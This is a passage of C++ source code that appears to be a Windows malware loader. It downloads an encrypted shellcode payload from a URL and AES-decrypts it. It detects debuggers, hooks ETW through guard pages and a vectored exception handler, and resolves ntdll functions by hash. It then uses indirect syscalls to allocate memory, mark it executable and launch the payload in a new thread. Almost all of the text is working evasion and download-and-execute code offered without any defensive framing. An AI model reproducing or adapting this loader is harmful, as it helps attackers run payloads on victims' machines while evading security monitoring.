	DWORD oldProtect;
	VirtualProtect(g_EtwEventWrite, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &oldProtect);

	AddVectoredExceptionHandler(1, VectoredHandler);
	OutputDebugStringA("Hook installed.\n");

	ForceEtwCall();
}


void nquangit_huffrun(std::vector<BYTE>& decrypted, int* run_status) {

	PVOID BaseAddress = NULL, Shellcode;
	SIZE_T dwSize = 0x1000;

	LPVOID addr = NULL;
	WORD syscallNum;
	SIZE_T ulOrgSize = 0;

	if (CheckDebugger()) {
		// print(STATUS, "[!] Debugger detected! Exiting...\n");
		*run_status = 1; // Set status to indicate failure
		return;
	}

	// Load the ntdll.dll module
	HMODULE mod = getModule(0x3e8557); // Hash of ntdll.dll
	if (mod == NULL) {
		// print(FAIL, "[!] Error loading ntdll.dll module.\n");
		*run_status = 1; // Set status to indicate failure
		return;
	}


	// ==================================== START OF THE BYPASS ETW ====================================
	//CALL(&BypassETW, mod, run_status);
	//CALL(&SetupHook, mod, run_status);
	//SetupHook(mod, run_status);
	//SetupHook();

	if (*run_status != 0) {
		// print(FAIL, "[!] Bypass ETW failed with status: %d\n", *run_status);
		return; // Exit if the bypass failed
	}
	// ==================================== END OF THE BYPASS ETW ====================================

	//std::vector<BYTE> decrypted = AESDecryptor::aes_decrypt(shellcode, AESKey, AESIV);

	// Deobfuscating the payload using Huffman Coding Algorithm 
	//Shellcode = huffman_decode((PBYTE)shellcode.data(), shellcode.size(), TRUE, &ulOrgSize);
	Shellcode = decrypted.data();
	ulOrgSize = decrypted.size();

	//printf("Downloaded successfully");


	if (!Shellcode)
	{
		// print(FAIL, "[-] Huffman Coding algorithm has failed to decompress the payload !");
		*run_status = 1; // Set status to indicate failure
		return;
	}

	addr = getAPIAddr(mod, 0x112da6be2b35);	// hash of ZwAllocateVirtualMemory
	if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN) {
		*run_status = 1; // Set status to indicate failure
		return;
	}

	AmmunitionPrepare(syscallNum);
	dwSize = ulOrgSize;

	NTSTATUS status = GunFire(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		// print(FAIL, "[!] Failed to allocate memory (0x%lx).\n", status);
		*run_status = 2; // Set status to indicate failure
		return;
	}
	else {
		// print(SUCCESS, "[+] Memory allocated for payload execution.\n");
	}

	for (SIZE_T i = 0; i < ulOrgSize; i++)
		((PBYTE)BaseAddress)[i] = ((PBYTE)Shellcode)[i];

	// print(SUCCESS, "[+] Payload copied to allocated memory successfully.\n");

	// Get rid of the malicious instructions from the main heap
	ZeroMemory(Shellcode, ulOrgSize);
	//free(Shellcode);


	DWORD OldProtect = 0;

	addr = getAPIAddr(mod, 0x59ef896aad4); // Hash of NtProtectVirtualMemory
	if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
	{
		*run_status = 1; // Set status to indicate failure
		return;
	}

	AmmunitionPrepare(syscallNum);

	NTSTATUS NtProtectStatus = GunFire(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus)) {
		// print(FAIL, "[!] Failed in sysNtProtectVirtualMemory (0x%lx).\n", NtProtectStatus);
		*run_status = 3; // Set status to indicate failure
		return;
	}
	else {
		// print(SUCCESS, "[+] Memory permissions updated to execute the payload.\n");
	}


	HANDLE hHostThread = INVALID_HANDLE_VALUE;

	addr = getAPIAddr(mod, 0x1f7ecc338); // Hash of NtCreateThreadEx
	if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
	{
		*run_status = 1; // Set status to indicate failure
		return;
	}

	AmmunitionPrepare(syscallNum);

	NTSTATUS NtCreateThreadStatus = GunFire(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(NtCreateThreadStatus)) {
		// print(FAIL, "[!] Failed in sysNtCreateThreadEx (0x%lx).\n", NtCreateThreadStatus);
		*run_status = 4; // Set status to indicate failure
		return;
	}
	else {
		// print(SUCCESS, "[+] Payload execution thread created successfully.\n");
	}

	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;

	addr = getAPIAddr(mod, 0x1dfafc993bc); // Hash of NtWaitForSingleObject
	if ((syscallNum = FindAmmunitionsAndPrepareGun(addr)) == INVALID_SSN)
	{
		*run_status = 1; // Set status to indicate failure
		return;
	}

	AmmunitionPrepare(syscallNum);

	NTSTATUS NTWFSOStatus = GunFire(hHostThread, FALSE, &Timeout);
	if (!NT_SUCCESS(NTWFSOStatus)) {
		// print(FAIL, "[!] Failed in sysNtWaitForSingleObject (0x%lx).\n", NTWFSOStatus);
		*run_status = 5; // Set status to indicate failure
		return;
	}
	else {
		// print(SUCCESS, "[+] Payload execution completed successfully.\n");
	}
	Sleep(100000000); // Sleep milliseconds, 100000s = 100000 * 1000 ms

	*run_status = 0; // Set status to indicate failure
	return;

}

int main()
{
	std::vector<BYTE> shellcode;
	bool* dlstatus = new bool;
	*dlstatus = false; // Initialize dlstatus to false

	//if (!DownloadShellcode(SHELLCODE_URL, shellcode, dlstatus))
	//{
	//    // std::cerr << "Failed to download shellcode.\n";
	//    return 1;
	//}

	//CALL(&printf, "Very secure call\n");

	CALL(&DownloadShellcode, SHELLCODE_URL, shellcode, dlstatus);

	if (*dlstatus == false)
	{
		// std::cerr << "Failed to download shellcode.\n";
		return 1;
	}


	// The first 16 bytes is IV
	if (shellcode.size() >= 16) {
		shellcode.erase(shellcode.begin(), shellcode.begin() + 16);
	}

	// rwx_hunter(shellcode);
	std::vector<BYTE> decrypted = AESDecryptor::aes_decrypt(shellcode, (char*)AESKey, (char*)AESIV);

	//int status = execute(decrypted);
	//if (status != 0)
	//{
	//    // std::cerr << "Failed to execute shellcode.\n";
	//    return status;
	//}


	int* run_status = new int;
	*run_status = 0; // Initialize run_status to 0

	nquangit_huffrun(decrypted, run_status);

	//CALL(&nquangit_huffrun, decrypted, run_status);

	return *run_status; // Trả về trạng thái thực thi
}



//extern "C" __declspec(dllexport) int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int)
//{
	//return main();
//}